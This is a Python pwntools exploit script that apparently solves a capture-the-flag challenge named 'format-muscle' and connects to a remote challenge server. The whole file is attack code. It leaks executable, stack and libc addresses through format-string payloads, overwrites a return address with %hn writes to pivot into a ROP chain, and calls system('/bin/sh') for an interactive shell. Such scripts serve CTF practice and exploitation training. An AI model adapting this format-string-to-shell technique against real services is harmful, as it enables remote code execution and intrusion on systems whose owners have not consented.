#!/usr/bin/env python3

from pwn import *


def s(p, data): p.send(data)
def sl(p, data): p.sendline(data)
def sla(p, msg, data): p.sendlineafter(msg, data)
def sa(p, msg, data): p.sendafter(msg, data)
def rl(p): return p.recvline()
def ru(p, msg): return p.recvuntil(msg)
def r(p, size): return p.recv(size)


def intFromByte(p, size):
    o = p.recv(size)[::-1].hex()
    output = '0x' + o
    leak = int(output, 16)
    return leak


def get_exe_base(pid):
    maps_file = f"/proc/{pid}/maps"
    exe_base = None

    with open(maps_file, 'r') as f:
        exe_base = int(f.readline().split('-')[0], 16)

    if exe_base is None:
        raise Exception("Executable base address not found.")

    return exe_base


def leak(p, payload):
    sl(p, payload)
    ru(p, b'|')
    leak = int(ru(p, b'|').replace(b'|', b''), 16)
    return leak


def GDB(p):
    base = get_exe_base(p.pid)
    gdb.attach(p, gdbscript='''
        b*main+92
        c
    ''')
    input()


def main():
    context.binary = exe = ELF("./format-muscle_patched", checksec=False)
    libc = ELF("./libc.so.6", checksec=False)
    ld = ELF("./ld-musl-x86_64.so.1", checksec=False)
    # p = process(exe.path)
    p = remote("format-muscle.chal.crewc.tf", 1337)

    # leak information
    payload = b'%p'*32 + b'|%p|'
    exe_leak = leak(p, payload)

    payload = b'%p'*36 + b'|%p|'
    stack = leak(p, payload)

    payload = b'%p'*40 + b'|%p|'
    lib_leak = leak(p, payload)

    print("exe leak:", hex(exe_leak))
    print("stack:", hex(stack))
    print("lib leak:", hex(lib_leak))

    exe_base = exe_leak - 4505
    lib_base = lib_leak - 110558
    print("exe base:", hex(exe_base))
    print("lib base:", hex(lib_base))
    target = stack - 0x158
    pop_rdi = lib_base + 0x00000000000152a1
    system = lib_base + 0x4e0c0
    # change information
    add_rsp_0x90 = lib_base + 0x0000000000058faa
    package = {
        add_rsp_0x90 >> 0 & 0xffff: target,
        add_rsp_0x90 >> 16 & 0xffff: target+2,
        add_rsp_0x90 >> 32 & 0xffff: target+4,
    }
    # GDB(p)
    order = sorted(package)
    off = 20-2
    pa = f"%{order[0] -off}c".encode() + b'%c'*off + b'%hn'
    pa += f"%{order[1] - order[0]}c".encode() + b'%hn'
    pa += f"%{order[2] - order[1]}c".encode() + b'%hn'
    pa = pa.ljust(0x70)
    pa += flat(package[order[0]], 0, package[order[1]], 0, package[order[2]])
    pa += flat(
        pop_rdi,
        target+0xb8,
        system,
        b'/bin/sh\0'
    )
    sl(p, pa)
    p.interactive()


if __name__ == "__main__":
    main()
